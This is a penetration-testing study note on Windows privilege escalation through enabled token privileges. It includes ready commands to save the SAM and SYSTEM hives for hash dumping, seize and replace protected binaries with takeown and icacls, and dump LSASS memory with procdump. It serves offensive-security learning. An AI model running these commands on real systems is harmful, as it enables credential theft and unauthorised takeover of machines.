# 🪟 Windows Special Privileges (SeBackup, SeRestore, SeLoadDriver…)

> Beyond `SeImpersonate`, several privileges each have a dedicated escalation. If `whoami /priv` shows one enabled, there's usually a direct route to SYSTEM or to dumping admin hashes.

Part of [[Windows Privilege Escalation]]. Related: [[Token Privileges & Potato]] · [[Dumping Windows Hashes]]

---

## 🧠 THINK
- Read the **full** `whoami /priv` — not just `SeImpersonate`.
- Each privilege = a known technique; pick the one you have.

## ⚡ DETECT
```cmd
whoami /priv
```
**Look for (Enabled):** `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, `SeManageVolumePrivilege`, `SeDebugPrivilege` (+ `SeImpersonate` → [[Token Privileges & Potato]]).

## 💥 EXPLOIT (by privilege)
**`SeBackupPrivilege`** — read any file → copy SAM+SYSTEM, dump offline:
```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.hive
```
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```
(Or use `robocopy /b` / diskshadow to grab protected files.) Then → [[Dumping Windows Hashes]].

**`SeRestorePrivilege`** — write any file → replace a service binary or hijack a DLL/`Utilman.exe`, or set an admin. (Pair with SeBackup.)

**`SeTakeOwnershipPrivilege`** — take ownership of a sensitive file (e.g. a service exe or `sethc.exe`), grant yourself full control, replace it:
```cmd
takeown /f C:\path\to\target.exe
```
```cmd
icacls C:\path\to\target.exe /grant %USERNAME%:F
```

**`SeLoadDriverPrivilege`** — load a malicious/vulnerable driver (e.g. Capcom) → SYSTEM (use a known PoC).

**`SeManageVolumePrivilege`** — gain broad write access to the volume → arbitrary file write to a privileged location (public PoC).

**`SeDebugPrivilege`** — open/inject into SYSTEM processes; dump LSASS (`procdump -ma lsass.exe`) → creds → [[Credential Attacks]].

## 🔁 FOUND → NEXT
| PRIVILEGE (Enabled) | ROUTE |
|---|---|
| SeBackup | `reg save` SAM+SYSTEM → [[Dumping Windows Hashes]] |
| SeRestore | overwrite service/`Utilman` → SYSTEM |
| SeTakeOwnership | `takeown`+`icacls` → replace target |
| SeLoadDriver | load vulnerable driver PoC → SYSTEM |
| SeManageVolume | PoC → arbitrary write → SYSTEM |
| SeDebug | dump LSASS → creds |
| SeImpersonate | Potato → [[Token Privileges & Potato]] |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Privilege listed but Disabled | some can be enabled in-process; else different vector |
| SeBackup hive copy blocked | try diskshadow/robocopy `/b`; shadow copy path |
| Driver PoC won't load | match OS/arch; signed-driver enforcement may block — pick another priv |
| None of these present | back to [[Windows Service Exploits]] / [[Windows Stored Credentials]] / [[Windows Kernel Exploits]] |

## 📇 CHEAT SHEET
```cmd
whoami /priv
```
```cmd
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive   :: SeBackup
```
```cmd
takeown /f <file> & icacls <file> /grant %USERNAME%:F           :: SeTakeOwnership
```
**Kill shot:** match the enabled privilege to its technique → SYSTEM or admin hashes.
